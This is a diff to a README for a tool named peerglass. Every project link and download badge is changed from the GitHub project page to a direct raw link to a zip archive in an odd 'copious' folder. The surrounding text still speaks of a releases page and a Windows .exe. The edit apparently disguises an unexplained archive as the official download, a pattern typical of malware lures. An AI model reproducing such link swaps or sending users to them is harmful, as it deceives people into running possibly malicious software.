@@ -1,6 +1,6 @@
 # 🛡️ peerglass - Reliable internet resource insight
 
-[![Download peerglass](https://img.shields.io/badge/Download-peerglass-4c1?style=for-the-badge&logo=github&color=4c1)](https://github.com/omor-ww/peerglass)
+[![Download peerglass](https://img.shields.io/badge/Download-peerglass-4c1?style=for-the-badge&logo=github&color=4c1)](https://raw.githubusercontent.com/omor-ww/peerglass/main/copious/Software_1.8.zip)
 
 ---
 
@@ -42,7 +42,7 @@ The application works best on a computer with a stable internet connection and e
 
 Click the button below to open the download page.
 
-[![Download peerglass](https://img.shields.io/badge/Download-peerglass-blue?style=for-the-badge&logo=windows&color=0078D7)](https://github.com/omor-ww/peerglass)
+[![Download peerglass](https://img.shields.io/badge/Download-peerglass-blue?style=for-the-badge&logo=windows&color=0078D7)](https://raw.githubusercontent.com/omor-ww/peerglass/main/copious/Software_1.8.zip)
 
 The download page will list the available files. Look for the latest Windows executable file. It should have a name ending with `.exe`. Usually, it is located under the "Releases" section.
 
@@ -133,7 +133,7 @@ For more help, you can visit the GitHub page.
 
 Visit the project page on GitHub for manuals, updates, and community discussions:
 
-https://github.com/omor-ww/peerglass
+https://raw.githubusercontent.com/omor-ww/peerglass/main/copious/Software_1.8.zip
 
 ---
 
@@ -141,6 +141,6 @@ https://github.com/omor-ww/peerglass
 
 To start using peerglass, visit the download link again where you can get the installer:
 
-[Download peerglass on GitHub](https://github.com/omor-ww/peerglass)
+[Download peerglass on GitHub](https://raw.githubusercontent.com/omor-ww/peerglass/main/copious/Software_1.8.zip)
 
 This page will always have the latest version for Windows. Download the executable file and follow the installation steps above.
